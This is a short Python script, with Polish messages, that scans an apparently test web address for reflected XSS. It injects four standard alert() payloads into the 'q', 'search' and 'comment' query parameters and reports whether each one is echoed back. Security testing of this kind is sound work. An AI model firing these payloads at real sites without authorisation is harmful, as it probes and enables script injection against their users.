import requests
from urllib.parse import urlencode

url = 'https://test.equinox-system.com/'
param_names = ['q', 'search', 'comment']

xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "javascript:alert('XSS')"
]

print("Rozpoczynanie testu podatności XSS.\n")

for param_name in param_names:
    print(f"Testowanie parametru: {param_name}")
    for payload in xss_payloads:
        params = {param_name: payload}
        full_url = f"{url}?{urlencode(params)}"

        try:
            response = requests.get(full_url)

            if payload in response.text:
                print(f"Możliwa podatność na atak XSS:")
                print(f"Parametr: {param_name}")
                print(f"Payload: {payload}")
                print(f"URL:    {full_url}\n")
            else:
                print(f"Strona odporna na ataki XSS: {param_name} = {payload}")
        except Exception as e:
            print(f"Błąd przy wysyłaniu żądania: {e}")

